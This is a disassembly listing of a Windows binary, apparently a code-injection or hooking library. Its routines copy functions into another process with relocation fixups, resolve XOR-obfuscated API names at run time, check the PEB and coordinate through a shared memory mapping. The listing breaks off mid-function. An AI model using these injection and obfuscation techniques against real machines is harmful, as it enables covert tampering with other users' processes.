sub_40AAB4	proc near		; CODE XREF: sub_40AB3C+2p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_0]
		push	0
		push	esp
		push	20h
		push	ecx
		push	edx
		call	ds:dword_416980
		pop	ecx
		cmp	eax, 0
		jnz	short loc_40AB31
		call	ds:dword_416988
		and	eax, 80000000h
		cmp	eax, 0
		jz	short loc_40AB36
		mov	eax, [ebp+arg_0]
		and	eax, 80000000h
		cmp	eax, 0
		jz	short loc_40AB36
		mov	eax, [ebp+arg_0]
		and	eax, 0FFFh
		add	eax, [ebp+arg_4]
		add	eax, 0FFFh
		shr	eax, 0Ch
		push	0
		push	0FFFDFFFFh
		push	eax
		mov	eax, [ebp+arg_0]
		shr	eax, 0Ch
		push	eax
		push	1000Dh
		call	ds:dword_41697C
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_0]
		push	ecx
		push	edx
		call	ds:dword_416984
		cmp	eax, 0
		jnz	short loc_40AB31
		xor	eax, eax
		jmp	short loc_40AB36
; ---------------------------------------------------------------------------

loc_40AB31:				; CODE XREF: sub_40AAB4+1Aj
					; sub_40AAB4+77j
		mov	eax, 1

loc_40AB36:				; CODE XREF: sub_40AAB4+2Aj
					; sub_40AAB4+37j ...
		pop	ebp
		retn	8
sub_40AAB4	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40AB3C	proc near		; CODE XREF: sub_40CB00+A0p
					; sub_40CD20+49p ...
		push	edx
		push	eax
		call	sub_40AAB4
		retn
sub_40AB3C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40AB44	proc near		; CODE XREF: sub_40AF50+1A2p
					; sub_40AF50+1B7p ...

var_8C		= dword	ptr -8Ch
var_88		= dword	ptr -88h
var_6C		= byte ptr -6Ch
var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
dwErrCode	= dword	ptr -58h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_40		= byte ptr -40h
var_3C		= dword	ptr -3Ch
var_34		= dword	ptr -34h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFF94h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_C], ebx
		mov	ebx, ecx
		mov	[ebp+var_4], edx
		mov	esi, eax
		lea	eax, [ebp+var_6C]
		mov	edx, off_407188
		call	sub_403FD8
		xor	eax, eax
		push	ebp
		push	offset loc_40AD9A
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	eax, eax
		mov	[ebp+var_8], eax
		lea	edx, [ebp+var_6C]
		mov	eax, esi
		call	sub_4097C0
		cmp	[ebp+var_6C], 0
		jnz	short loc_40AB98
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		jmp	loc_40AD76
; ---------------------------------------------------------------------------

loc_40AB98:				; CODE XREF: sub_40AB44+44j
		cmp	[ebp+var_40], 0
		jnz	short loc_40ABAC
		mov	eax, [ebp+var_34]
		push	eax		; dwErrCode
		call	SetLastError
		jmp	loc_40AD76
; ---------------------------------------------------------------------------

loc_40ABAC:				; CODE XREF: sub_40AB44+58j
		test	bl, bl
		jnz	short loc_40ABC5
		cmp	[ebp+var_48], 0
		jz	short loc_40ABC5
		push	770000h		; dwErrCode
		call	SetLastError
		jmp	loc_40AD76
; ---------------------------------------------------------------------------

loc_40ABC5:				; CODE XREF: sub_40AB44+6Aj
					; sub_40AB44+70j
		cmp	[ebp+var_4], 0
		jz	short loc_40ABD7
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40ABDF

loc_40ABD7:				; CODE XREF: sub_40AB44+85j
		call	GetCurrentProcess
		mov	[ebp+var_4], eax

loc_40ABDF:				; CODE XREF: sub_40AB44+91j
		mov	eax, [ebp+var_4]
		push	eax
		mov	ebx, [ebp+var_3C]
		push	ebx
		call	sub_40A770
		mov	[ebp+var_2C], eax
		lea	eax, [ebp+var_C]
		mov	edx, ebx
		call	sub_403F0C
		mov	ebx, [ebp+var_C]
		mov	eax, ebx
		mov	ecx, [ebp+var_60]
		add	eax, ecx
		add	eax, 4
		mov	[ebp+var_14], eax
		mov	esi, [ebp+var_2C]
		mov	edi, esi
		add	edi, ecx
		add	edi, 4
		mov	[ebp+var_18], edi
		mov	eax, [ebp+var_64]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, ebx
		xor	edx, edx
		sub	[esp+8Ch+var_8C], eax
		sbb	[esp+8Ch+var_88], edx
		pop	eax
		pop	edx
		mov	[ebp+var_20], eax
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_64]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, esi
		xor	edx, edx
		sub	[esp+8Ch+var_8C], eax
		sbb	[esp+8Ch+var_88], edx
		pop	eax
		pop	edx
		mov	[ebp+var_28], eax
		mov	[ebp+var_24], edx
		mov	edx, [ebp+var_C]
		mov	eax, [ebp+var_64]
		call	sub_402664
		mov	eax, [ebp+var_4C]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	loc_40AD10
		inc	esi
		xor	edi, edi

loc_40AC6A:				; CODE XREF: sub_40AB44+1C6j
		mov	eax, edi
		shl	eax, 3
		sub	eax, edi
		mov	edx, [ebp+var_4C]
		lea	ebx, [edx+eax*4]
		cmp	dword ptr [ebx+14h], 0
		jnz	short loc_40AC87
		cmp	dword ptr [ebx+18h], 0
		jz	loc_40AD08

loc_40AC87:				; CODE XREF: sub_40AB44+137j
		cmp	byte ptr [ebx+10h], 0
		jz	short loc_40ACC4
		mov	eax, [ebx+0Ch]
		call	sub_409A8C
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebx+14h]
		xor	edx, edx
		sub	eax, [ebp+var_28]
		sbb	edx, [ebp+var_24]
		sub	[esp+8Ch+var_8C], eax
		sbb	[esp+8Ch+var_88], edx
		pop	eax
		pop	edx
		sub	eax, 4
		sbb	edx, 0
		mov	ecx, eax
		mov	eax, [ebx+14h]
		xor	edx, edx
		sub	eax, [ebp+var_20]
		sbb	edx, [ebp+var_1C]
		mov	[eax], ecx
		jmp	short loc_40AD08
; ---------------------------------------------------------------------------

loc_40ACC4:				; CODE XREF: sub_40AB44+147j
		cmp	dword ptr [ebx+18h], 0
		jz	short loc_40ACF1
		mov	eax, [ebx+0Ch]
		call	sub_409A8C
		mov	edx, [ebp+var_14]
		mov	[edx], eax
		mov	eax, [ebx+18h]
		xor	edx, edx
		sub	eax, [ebp+var_20]
		sbb	edx, [ebp+var_1C]
		mov	edx, [ebp+var_18]
		mov	[eax], edx
		add	[ebp+var_14], 4
		add	[ebp+var_18], 4
		jmp	short loc_40AD08
; ---------------------------------------------------------------------------

loc_40ACF1:				; CODE XREF: sub_40AB44+184j
		mov	eax, [ebx+0Ch]
		call	sub_409A8C
		mov	ecx, eax
		mov	eax, [ebx+14h]
		xor	edx, edx
		sub	eax, [ebp+var_20]
		sbb	edx, [ebp+var_1C]
		mov	[eax], ecx

loc_40AD08:				; CODE XREF: sub_40AB44+13Dj
					; sub_40AB44+17Ej ...
		inc	edi
		dec	esi
		jnz	loc_40AC6A

loc_40AD10:				; CODE XREF: sub_40AB44+11Dj
		call	sub_409EB0
		lea	eax, [ebp+var_10]
		push	eax
		mov	eax, [ebp+var_C]
		call	sub_403C24
		push	eax
		mov	eax, [ebp+var_C]
		push	eax
		mov	eax, [ebp+var_2C]
		push	eax
		mov	eax, [ebp+var_4]
		push	eax
		call	ds:dword_416958
		test	eax, eax
		jz	short loc_40AD51
		mov	eax, [ebp+var_C]
		call	sub_403C24
		cmp	eax, [ebp+var_10]
		jnz	short loc_40AD51
		mov	eax, [ebp+var_68]
		sub	eax, [ebp+var_64]
		add	eax, [ebp+var_2C]
		mov	[ebp+var_8], eax

loc_40AD51:				; CODE XREF: sub_40AB44+1F2j
					; sub_40AB44+1FFj
		cmp	[ebp+arg_4], 0
		jz	short loc_40AD5F
		mov	eax, [ebp+arg_4]
		mov	edx, [ebp+var_2C]
		mov	[eax], edx

loc_40AD5F:				; CODE XREF: sub_40AB44+211j
		cmp	[ebp+arg_0], 0
		jz	short loc_40AD76
		mov	eax, [ebp+arg_0]
		lea	edx, [ebp+var_6C]
		mov	ecx, off_407188
		call	sub_4041F8

loc_40AD76:				; CODE XREF: sub_40AB44+4Fj
					; sub_40AB44+63j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40ADA1

loc_40AD83:				; CODE XREF: sub_40AB44+25Bj
		lea	eax, [ebp+var_6C]
		mov	edx, off_407188
		call	sub_40409C
		lea	eax, [ebp+var_C]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40AD9A:				; DATA XREF: sub_40AB44+26o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40AD83
; ---------------------------------------------------------------------------

loc_40ADA1:				; CODE XREF: sub_40AB44+255j
					; DATA XREF: sub_40AB44+23Ao
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_40AB44	endp

; ---------------------------------------------------------------------------
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetKernelObjectSecurity. PRESS KEYPAD "+"	TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40ADB8	proc near		; DATA XREF: sub_40AF50+199o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	0FFFFFFFFh
		mov	eax, [ebx+10h]
		push	eax
		call	ds:dword_416998
		mov	eax, [ebx+10h]
		push	eax
		call	ds:dword_4169A8
		mov	eax, [ebx+0Ch]
		push	eax
		call	ds:dword_416994
		push	ebx
		call	ds:dword_416950
		xor	eax, eax
		pop	ebx
		pop	ebp
		retn	4
sub_40ADB8	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40ADF0	proc near		; DATA XREF: sub_40AF50+1AEo

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= byte ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFECh
		push	ebx
		push	esi
		push	edi
		mov	eax, large fs:30h
		mov	[ebp+var_4], eax
		xor	eax, eax
		mov	[ebp+var_8], eax
		mov	eax, [ebp+var_4]
		add	eax, 44h
		mov	ebx, [eax]
		call	ds:dword_4169B4
		xor	eax, [ebp+var_4]
		mov	[ebp+var_10], eax
		mov	[ebp+var_14], 14h

loc_40AE23:				; CODE XREF: sub_40ADF0+6Bj
		xor	esi, esi
		mov	edx, [ebx]
		dec	edx
		test	edx, edx
		jl	short loc_40AE4D
		inc	edx
		xor	eax, eax

loc_40AE2F:				; CODE XREF: sub_40ADF0+5Bj
		mov	edi, [ebx+eax*8+8]
		test	edi, edi
		jz	short loc_40AE49
		cmp	edi, [ebp+var_10]
		jz	short loc_40AE49
		test	byte ptr [ebx+eax*8+7],	80h
		jnz	short loc_40AE49
		inc	esi
		cmp	esi, 1
		jg	short loc_40AE4D

loc_40AE49:				; CODE XREF: sub_40ADF0+45j
					; sub_40ADF0+4Aj ...
		inc	eax
		dec	edx
		jnz	short loc_40AE2F

loc_40AE4D:				; CODE XREF: sub_40ADF0+3Aj
					; sub_40ADF0+57j
		dec	esi
		jg	short loc_40AE5D
		push	64h
		call	ds:dword_4169B8
		dec	[ebp+var_14]
		jnz	short loc_40AE23

loc_40AE5D:				; CODE XREF: sub_40ADF0+5Ej
		mov	eax, [ebp+var_4]
		add	eax, 20h
		test	dword ptr [eax], 30800000h
		jnz	loc_40AF37
		lea	eax, [ebp+var_C]
		push	eax
		push	0
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		push	eax
		push	0
		push	0
		call	ds:dword_4169AC
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_40AF2B
		push	0FFFFFFFFh
		push	ebx
		call	ds:dword_416998
		lea	eax, [ebp+var_8]
		push	eax
		push	ebx
		call	ds:dword_4169B0
		mov	eax, [ebp+var_4]
		add	eax, 20h
		test	dword ptr [eax], 30800000h
		jnz	short loc_40AF1F
		push	2
		push	0
		push	0
		mov	eax, [ebp+arg_0]
		add	eax, 10h
		push	eax
		call	ds:dword_41699C
		push	eax
		call	ds:dword_4169A0
		push	eax
		call	ds:dword_41699C
		push	eax
		call	ds:dword_4169A4
		test	eax, eax
		jz	short loc_40AF1F
		push	8003h
		call	ds:dword_416994
		mov	edx, [ebp+arg_0]
		mov	[edx+0Ch], eax
		lea	eax, [ebp+var_C]
		push	eax
		push	0
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		push	eax
		push	0
		push	0
		call	ds:dword_4169AC
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_40AF41
		push	ebx
		call	ds:dword_4169A8
		jmp	short loc_40AF41
; ---------------------------------------------------------------------------

loc_40AF1F:				; CODE XREF: sub_40ADF0+C6j
					; sub_40ADF0+F2j
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_416950
		jmp	short loc_40AF41
; ---------------------------------------------------------------------------

loc_40AF2B:				; CODE XREF: sub_40ADF0+A0j
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_416950
		jmp	short loc_40AF41
; ---------------------------------------------------------------------------

loc_40AF37:				; CODE XREF: sub_40ADF0+79j
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_416950

loc_40AF41:				; CODE XREF: sub_40ADF0+124j
					; sub_40ADF0+12Dj ...
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40ADF0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40AF50	proc near		; CODE XREF: sub_40B410+3D7p

var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_5		= byte ptr -5
hObject		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		push	edi
		xor	ecx, ecx
		mov	[ebp+var_C], ecx
		mov	esi, edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_40B179
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	ds:dword_416994, 0
		jnz	loc_40B013
		mov	eax, offset dword_40B194
		call	sub_409880
		mov	ds:dword_416994, eax
		mov	eax, offset dword_40B1AC
		call	sub_409880
		mov	ds:dword_416998, eax
		mov	eax, offset dword_40B1C8
		call	sub_409880
		mov	ds:dword_41699C, eax
		mov	eax, offset dword_40B1E4
		call	sub_409880
		mov	ds:dword_4169A0, eax
		mov	eax, offset dword_40B200
		call	sub_409880
		mov	ds:dword_4169A4, eax
		mov	eax, offset dword_40B218
		call	sub_409880
		mov	ds:dword_4169A8, eax
		mov	eax, offset dword_40B22C
		call	sub_409880
		mov	ds:dword_4169AC, eax
		mov	eax, offset dword_40B244
		call	sub_409880
		mov	ds:dword_4169B0, eax
		mov	eax, offset dword_40B260
		call	sub_409880
		mov	ds:dword_4169B4, eax
		mov	eax, offset dword_40B27C
		call	sub_409880
		mov	ds:dword_4169B8, eax

loc_40B013:				; CODE XREF: sub_40AF50+27j
		cmp	ds:dword_41698C, 0
		jnz	loc_40B143
		call	GetVersion_0
		test	eax, 80000000h
		jz	loc_40B143
		lea	edx, [ebp+var_C]
		mov	eax, offset dword_40B28C
		call	sub_4064CC
		mov	eax, [ebp+var_C]
		call	sub_403E24
		push	eax		; lpName
		push	10h		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		push	0		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40B143
		call	GetLastError
		cmp	eax, 0B7h
		setnz	[ebp+var_5]
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	edi, eax
		test	edi, edi
		jz	loc_40B13A
		mov	[ebp+var_10], 32h

loc_40B095:				; CODE XREF: sub_40AF50+171j
		cmp	[ebp+var_5], 0
		jnz	short loc_40B0C3
		mov	eax, [edi]
		mov	edx, [edi+4]
		push	edx
		push	eax
		mov	eax, [ebp+var_C]
		mov	edx, [eax+4]
		mov	eax, [eax]
		cmp	edx, [esp+30h+var_2C]
		jnz	short loc_40B0B3
		cmp	eax, [esp+30h+var_30]

loc_40B0B3:				; CODE XREF: sub_40AF50+15Ej
		pop	edx
		pop	eax
		jz	short loc_40B0C3
		push	32h		; dwMilliseconds
		call	Sleep
		dec	[ebp+var_10]
		jnz	short loc_40B095

loc_40B0C3:				; CODE XREF: sub_40AF50+149j
					; sub_40AF50+165j
		cmp	[ebp+var_5], 0
		jnz	short loc_40B0E5
		mov	eax, [edi]
		mov	edx, [edi+4]
		push	edx
		push	eax
		mov	eax, [ebp+var_C]
		mov	edx, [eax+4]
		mov	eax, [eax]
		cmp	edx, [esp+30h+var_2C]
		jnz	short loc_40B0E1
		cmp	eax, [esp+30h+var_30]

loc_40B0E1:				; CODE XREF: sub_40AF50+18Cj
		pop	edx
		pop	eax
		jz	short loc_40B124

loc_40B0E5:				; CODE XREF: sub_40AF50+177j
		push	0
		push	0
		mov	eax, offset sub_40ADB8
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	[edi+8], eax
		push	0
		push	0
		mov	eax, offset sub_40ADF0
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	[edi+0Ch], eax
		mov	eax, [ebp+var_C]
		mov	edx, [eax]
		mov	[edi], edx
		mov	edx, [eax+4]
		mov	[edi+4], edx
		mov	eax, [ebp+hObject]
		call	sub_40A660

loc_40B124:				; CODE XREF: sub_40AF50+193j
		mov	eax, [edi+8]
		mov	ds:dword_41698C, eax
		mov	eax, [edi+0Ch]
		mov	ds:dword_416990, eax
		push	edi		; lpBaseAddress
		call	UnmapViewOfFile

loc_40B13A:				; CODE XREF: sub_40AF50+138j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40B143:				; CODE XREF: sub_40AF50+CAj
					; sub_40AF50+DAj ...
		mov	eax, ds:dword_41698C
		mov	[ebx], eax
		mov	eax, ds:dword_416990
		mov	[esi], eax
		cmp	dword ptr [ebx], 0
		jz	short loc_40B15B
		cmp	dword ptr [esi], 0
		jnz	short loc_40B15F

loc_40B15B:				; CODE XREF: sub_40AF50+204j
		xor	eax, eax
		jmp	short loc_40B161
; ---------------------------------------------------------------------------

loc_40B15F:				; CODE XREF: sub_40AF50+209j
		mov	al, 1

loc_40B161:				; CODE XREF: sub_40AF50+20Dj
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40B180

loc_40B170:				; CODE XREF: sub_40AF50+22Ej
		lea	eax, [ebp+var_C]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40B179:				; DATA XREF: sub_40AF50+15o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40B170
; ---------------------------------------------------------------------------

loc_40B180:				; CODE XREF: sub_40AF50+228j
					; DATA XREF: sub_40AF50+21Bo
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40AF50	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ch
dword_40B194	dd 10213006h, 273A2727h, 30313A18h, 0 ;	DATA XREF: sub_40AF50+2Do
		dd 0FFFFFFFFh, 13h
dword_40B1AC	dd 213C3402h, 6273A13h,	39323B3Ch, 3F371A30h, 213630h
					; DATA XREF: sub_40AF50+3Co
		dd 0FFFFFFFFh, 11h
dword_40B1C8	dd 16213012h, 30272720h, 2705213Bh, 2630363Ah, 26h, 0FFFFFFFFh
					; DATA XREF: sub_40AF50+4Bo
		dd 10h
dword_40B1E4	dd 16213012h, 30272720h, 3D01213Bh, 31343027h, 0 ; DATA	XREF: sub_40AF50+5Ao
		dd 0FFFFFFFFh, 0Fh
dword_40B200	dd 39252011h, 2134363Ch, 3B341D30h, 303931h, 0FFFFFFFFh
					; DATA XREF: sub_40AF50+69o
		dd 0Bh
dword_40B218	dd 263A3916h, 3B341D30h, 303931h, 0FFFFFFFFh, 0Ch
					; DATA XREF: sub_40AF50+78o
dword_40B22C	dd 34302716h, 3D013021h, 31343027h, 0 ;	DATA XREF: sub_40AF50+87o
		dd 0FFFFFFFFh, 11h
dword_40B244	dd 10213012h, 16213C2Dh, 130313Ah, 3430273Dh, 31h, 0FFFFFFFFh
					; DATA XREF: sub_40AF50+96o
		dd 13h
dword_40B260	dd 16213012h, 30272720h, 2705213Bh, 2630363Ah, 311C26h
					; DATA XREF: sub_40AF50+A5o
		dd 0FFFFFFFFh, 5
dword_40B27C	dd 30303906h, 25h, 0FFFFFFFFh, 7 ; DATA	XREF: sub_40AF50+B4o
dword_40B28C	dd 73D3638h, 2D6C01h	; DATA XREF: sub_40AF50+E3o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40B294	proc near		; CODE XREF: sub_40B2E4+54p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, eax
		push	0
		lea	edx, [ebp+var_4]
		mov	eax, [ebx]
		mov	ecx, 4
		call	sub_409CC0
		test	al, al
		jz	short loc_40B2D9
		push	0
		lea	edx, [ebp+var_4]
		mov	ecx, 4
		mov	eax, [ebp+var_4]
		call	sub_409CC0
		test	al, al
		jz	short loc_40B2D9
		call	GetCurrentProcessId
		mov	ebx, eax
		call	sub_409B20
		xor	ebx, eax
		cmp	ebx, [ebp+var_4]
		jz	short loc_40B2DD

loc_40B2D9:				; CODE XREF: sub_40B294+1Aj
					; sub_40B294+30j
		xor	eax, eax
		jmp	short loc_40B2DF
; ---------------------------------------------------------------------------

loc_40B2DD:				; CODE XREF: sub_40B294+43j
		mov	al, 1

loc_40B2DF:				; CODE XREF: sub_40B294+47j
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40B294	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40B2E4	proc near		; CODE XREF: sub_40B410+1A7p
					; sub_40B410+1ECp

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		xor	eax, eax
		mov	[ebp+var_4], eax
		mov	eax, [ebx+20h]
		call	sub_404564
		mov	edi, eax
		cmp	edi, 0
		jl	short loc_40B363

loc_40B301:				; CODE XREF: sub_40B2E4+7Dj
		mov	esi, edi
		dec	esi
		cmp	esi, 0
		jl	short loc_40B35D

loc_40B309:				; CODE XREF: sub_40B2E4+77j
		mov	eax, edi
		shl	eax, 3
		sub	eax, edi
		mov	edx, [ebx+20h]
		mov	eax, [edx+eax*4+0Ch]
		mov	edx, esi
		shl	edx, 3
		sub	edx, esi
		mov	ecx, [ebx+20h]
		cmp	eax, [ecx+edx*4+0Ch]
		jnz	short loc_40B357
		mov	eax, edi
		shl	eax, 3
		sub	eax, edi
		mov	edx, [ebx+20h]
		mov	eax, [edx+eax*4+4]
		sub	eax, 6
		call	sub_40B294
		test	al, al
		jz	short loc_40B357
		mov	eax, edi
		shl	eax, 3
		sub	eax, edi
		mov	edx, [ebx+20h]
		mov	eax, [edx+eax*4+4]
		sub	eax, 6
		mov	[ebp+var_4], eax
		jmp	short loc_40B363
; ---------------------------------------------------------------------------

loc_40B357:				; CODE XREF: sub_40B2E4+41j
					; sub_40B2E4+5Bj
		dec	esi
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_40B309

loc_40B35D:				; CODE XREF: sub_40B2E4+23j
		dec	edi
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_40B301

loc_40B363:				; CODE XREF: sub_40B2E4+1Bj
					; sub_40B2E4+71j
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40B2E4	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40B36C	proc near		; CODE XREF: sub_40B410+555p
					; sub_40B410+563p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, eax
		mov	eax, offset dword_40B3A4
		call	sub_409880
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_40B38F
		lea	eax, [ebp+var_4]
		push	eax
		push	esi
		call	ebx
		test	eax, eax
		jnz	short loc_40B394

loc_40B38F:				; CODE XREF: sub_40B36C+16j
		xor	eax, eax
		mov	[ebp+var_4], eax

loc_40B394:				; CODE XREF: sub_40B36C+21j
		mov	eax, [ebp+var_4]
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40B36C	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 14h
dword_40B3A4	dd 363A2705h, 1C262630h, 63A0131h, 3C262630h, 311C3B3Ah
					; DATA XREF: sub_40B36C+8o
		dd 0

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40B3BC	proc near		; CODE XREF: sub_40B410+82p

var_1		= byte ptr -1

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	[ebp+var_1], 0
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40B406
		xor	eax, eax
		push	ebp
		push	offset loc_40B3FC
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	sub_409B20
		xor	ebx, eax
		test	byte ptr [ebx+20h], 18h
		setnz	[ebp+var_1]
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_40B406
; ---------------------------------------------------------------------------

loc_40B3FC:				; DATA XREF: sub_40B3BC+1Co
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_40B406:				; CODE XREF: sub_40B3BC+17j
					; sub_40B3BC+3Ej
		mov	al, [ebp+var_1]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40B3BC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40B410	proc near		; CODE XREF: sub_40D1F8+2A5p
					; sub_40DEDC+4D9p

var_1BC		= dword	ptr -1BCh
var_1B8		= dword	ptr -1B8h
var_184		= byte ptr -184h
var_160		= byte ptr -160h
var_120		= byte ptr -120h
var_DD		= byte ptr -0DDh
var_D8		= dword	ptr -0D8h
var_C8		= dword	ptr -0C8h
var_C3		= dword	ptr -0C3h
var_BE		= dword	ptr -0BEh
var_B8		= byte ptr -0B8h
var_B6		= word ptr -0B6h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
var_94		= dword	ptr -94h
var_90		= dword	ptr -90h
var_8C		= dword	ptr -8Ch
var_88		= byte ptr -88h
var_84		= dword	ptr -84h
var_7C		= dword	ptr -7Ch
var_6C		= dword	ptr -6Ch
var_68		= dword	ptr -68h
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= byte ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
hObject		= dword	ptr -1Ch
nLengthNeeded	= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
hSourceHandle	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		mov	ecx, 30h

loc_40B418:				; CODE XREF: sub_40B410+Dj
		push	0
		push	0
		dec	ecx
		jnz	short loc_40B418
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		mov	ebx, [ebp+hSourceHandle]
		lea	eax, [ebp+var_88]
		mov	edx, off_407188
		call	sub_403FD8
		xor	eax, eax
		push	ebp
		push	offset loc_40BAD7
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	eax, eax
		mov	[ebp+var_4], eax
		call	GetVersion_0
		test	eax, 80000000h
		jz	loc_40B8C1
